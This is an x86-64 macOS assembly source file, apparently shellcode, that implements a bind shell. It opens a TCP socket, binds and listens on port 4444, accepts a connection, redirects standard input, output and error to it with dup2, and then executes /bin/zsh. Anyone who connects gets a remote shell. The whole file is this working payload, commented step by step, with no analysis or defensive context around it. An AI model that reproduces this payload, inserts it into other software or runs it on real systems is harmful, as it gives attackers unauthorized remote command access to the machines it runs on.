bits 64
global _main

_main:
  ; socket

  push 0x2
  pop rdi 			      ; RDI = AF_INET = 2
  push 0x1 			      ; 
  pop rsi 			      ; RSI = SOCK_STREAM = 1
  xor rdx, rdx 		    ; RDX = IPPROTO_IP = 0

  ; store syscall number on the RAX

  push 0x61 			    ; put 97 on the stack (socket syscall number)
  pop rax 			      ; pop 97 to RAX
  bts rax, 25 		    ; set the 25th bit to 1
  syscall
  mov r9, rax 		    ; save the socket number (file descriptor)

  ; bind

  mov rdi, r9 		    ; put the saved socket fd value to RDI = socket fd

  ; begin building the structure

  xor rsi, rsi 		    ; RSI = sin_zero[8] = 0x0000000000000000
  push rsi

  ; next entry on the stack should be 0x00000000 5c11 02 00 = (sin_addr .. sin_len)

  mov esi, 0x5c110201   ; port sin_port=0x115c, sin_family=0x02, sin_len=0x01 (Then dec to 0x00)
  dec esi 			        ; sin_len=0x00
  push rsi 			        ; push RSI (0x000000005c110200) to the stack
  push rsp
  pop rsi 			        ; RSI = RSP = pointer to the structure

  push 0x10
  pop rdx 			        ; RDX = 0x10 = Length of the socket structure

  ; store syscall number on RAX

  push 0x68 			    ; put 104 on the stack (bind syscall)
  pop rax 			      ; pop it to rax
  bts rax, 25 		    ; set the 25th bit to 1
  syscall

  ; listen

  mov rdi, r9 		    ; put saved socket fd value into RDI
  xor rsi, rsi 		    ; rsi = 0

  ; store system call number on the RAX

  push 0x6a 			    ; put 106 on the stack (listen syscall)
  pop rax 			      ; pop it to RAX
  bts rax, 25 		    ; set 25th bit to 1
  syscall

  ; accept

  mov rdi, r9 		    ; put saved socket fd value to RDI
  xor rsi, rsi 		    ; *address = RSI = 0
  xor rdx, rdx 		    ; *address_len = RDX = 0

  ; store syscall number on RAX

  push 0x1e 			    ; put 30 on the stack (accept syscall)
  pop rax 			      ; pop it to rax
  bts rax, 25 		    ; set 25t bit to 1
  syscall
  mov r10, rax 		    ; save the returned file descriptor in r10

  ; dup2

  mov rdi, r10 		    ; put the fd into RDI
  push 2
  pop rsi 			      ; set RSI = 2

  dup2_loop: 			    ; beginning of our loop
  push 0x5a 			    ; put 90 on the stack (dup2 syscall)
  pop rax 			      ; pop it to rax
  bts rax, 25 		    ; set 25th bit to 1
  syscall
  dec rsi 			      ; decrement RSI
  jns dup2_loop 	    ; jump back to beginning of the loop if RSI >= 0

  ; execve

  xor rdx, rdx 		    ; zero rdx
  push rdx 			      ; push NULL string terminator
  mov rbx, '/bin/zsh'	; move string into RBX
  push rbx			      ; push string to the stack
  mov rdi, rsp 		    ; store the stack pointer in RDI
  push rdx			      ; argv[1] = 0 (we set to 0 in first instructions)
  push rdi			      ; argv[0] = /bin/zsh
  mov rsi, rsp		    ; argv = rsp - store RSP's value in RSI
  push 59			        ; put 59 on the stack
  pop rax			        ; pop to RAX
  bts rax, 25			    ; set 25th bit to 1
  syscall
